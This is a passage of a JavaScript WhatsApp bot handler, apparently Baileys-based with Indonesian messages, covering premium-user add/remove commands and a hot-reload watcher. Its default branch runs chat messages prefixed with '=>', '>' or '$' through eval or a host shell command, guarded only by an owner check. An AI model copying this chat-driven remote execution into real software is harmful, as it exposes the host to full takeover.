					return reply(`Example :\nAddprem 62xx 30d`);
				if (m.mentionedJid.length !== 0) {
					for (let i = 0; i < m.mentionedJid.length; i++) {
						addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
					}
					reply("Sukses Premium")
				} else {
					addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
					reply("Sukses Via Nomer")
					await sleep(2000)
					apollo.sendMessage(args[0] + "@s.whatsapp.net", {
						image: {
							url: `https://telegra.ph/file/4591e4839848523095e05.jpg`
						},
						caption: `Kamu sekarang adalah Anggota Premium`
					}, {
						quoted: vidq
					})
				}
			}
			break
			//=================================================//
			case "delprem": {
				if (!isBotRegistered) return reply(`NOT ACCES‼️`);
        if (!isCreator) return reply(`NOT ACCES‼️`);
				if (!isCreator) return reply(mess.owner)
				if (args.length < 1) return reply(`Example : \nDelprem 62xx`)
				if (m.mentionedJid.length !== 0) {
					for (let i = 0; i < m.mentionedJid.length; i++) {
						let mentionedPremiumIndex = orgkaya.findIndex(premium => premium.id === m.mentionedJid[i]);
						if (mentionedPremiumIndex !== -1) {
							orgkaya.splice(mentionedPremiumIndex, 1);
						}
					}
					fs.writeFileSync("./database/premium.json", JSON.stringify(orgkaya));
					reply("Sukses Delete");
				} else {
					let targetNumber = args[0] + "@s.whatsapp.net"
					let targetPremiumIndex = orgkaya.findIndex(premium => premium.id === targetNumber)
					if (targetPremiumIndex !== -1) {
						orgkaya.splice(targetPremiumIndex, 1)
						fs.writeFileSync("./database/premium.json", JSON.stringify(orgkaya))
						reply("Sukses Via Nomer")
						await sleep(2000)
						apollo.sendMessage(targetNumber, {
							image: {
								url: `https://telegra.ph/file/4591e4839848523095e05.jpg`
							},
							caption: ``
						}, {
							quoted: vidq
						})
					} else {
						reply("Entitas premium tidak ditemukan")
					}
				}
			}
			break
			//END\\
			//=================================================//

			default:
				if (budy.startsWith("=>")) {
				    if (!isBotRegistered) return reply(`NOT ACCES‼️`);
					if (!isCreator) return reply(mess.owner)

					function Return(sul) {
						sat = JSON.stringify(sul, null, 2)
						bang = util.format(sat)
						if (sat == undefined) {
							bang = util.format(sul)
						}
						return reply(bang)
					}
					try {
						reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
					} catch (e) {
						reply(String(e))
					}
				}
				//=================================================//
				if (budy.startsWith(">")) {
				    if (!isBotRegistered) return reply(`NOT ACCES‼️`);
					if (!isCreator) return reply(mess.owner)
					try {
						let evaled = await eval(budy.slice(2))
						if (typeof evaled !== "string") evaled = require("util").inspect(evaled)
						await reply(evaled)
					} catch (err) {
						await reply(String(err))
					}
				}
				//=================================================//
				if (budy.startsWith("$")) {
				    if (!isBotRegistered) return reply(`NOT ACCES‼️`);
					if (!isCreator) return reply(mess.owner)
					exec(budy.slice(2), (err, stdout) => {
						if (err) return reply(`${err}`)
						if (stdout) return reply(`${stdout}`)
					})
				}
		}
	} catch (err) {
		const handleError = async () => {
			console.log(require("util").format(err));
		};
		handleError();
	}
}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.whiteBright("�?"), chalk.keyword("red")("[ UPDATE ]"), __filename)
	delete require.cache[file]
	require(file)
})